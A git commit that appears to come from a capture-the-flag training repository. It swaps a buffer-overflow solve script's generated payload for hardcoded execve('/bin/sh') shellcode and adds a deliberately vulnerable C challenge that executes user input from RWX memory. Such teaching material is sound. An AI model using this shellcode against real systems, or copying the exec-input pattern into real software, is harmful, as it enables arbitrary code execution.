5a21d57b174cd30902fc7215ab2b7be75f84c50c
Enigmatrix <enigmatrix2000@gmail.com>
2021-07-23 15:49:04 +0800

    simple ones

--- 02_oldez/solve.py
+++ 02_oldez/solve.py
@@ -7,7 +7,7 @@ p.recvuntil('at ')
 name = int(p.recvuntil(':', drop=True), 16)
 success(f"name = {hex(name)}")
 
-shellcode = asm(pwnlib.shellcraft.amd64.linux.sh())
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
 
 inp  = b"A" * 0x40          # fill up name
 inp += b"B" * 0x08          # overwrite saved rbp (doesn't matter)
---
+++ 04_filters_isprint/main.c
@@ -0,0 +1,48 @@
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <ctype.h>
+#include <sys/mman.h>
+
+int setup() {
+    // turn off buffering, then printing to stdout etc will be better
+    setbuf(stdin,   NULL);
+    setbuf(stdout,  NULL);
+    setbuf(stderr,  NULL);
+}
+
+// fools to trust user input, really
+int is_valid(void* buffer) {
+    char* chars = (char*)buffer;
+    for(int i = 0; i < 0x1000; i++) {
+        if (isprint(chars[i])) {
+            return 0;
+        }
+    }
+    return 1;
+}
+
+void* create_rwx() {
+    void* buffer = mmap(
+        (void*)0x1337000,                       // allocate memory @ 0x1337000 ..
+        0x1000,                                 // with size 0x1000 ..
+        PROT_READ | PROT_WRITE | PROT_EXEC,     // with perms read-write-exec (rwx)
+        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
+    if (buffer < 0) {
+        perror("cannot allocate buffer");
+        exit(-1);
+    }
+    return buffer;
+}
+
+int main() {
+    setup();
+
+    void* buffer = create_rwx();
+    read(0, buffer, 0x1000);
+
+    if (is_valid(buffer)) {
+        ((void (*)(void)) buffer) (); // 'call' the buffer
+    }
+}
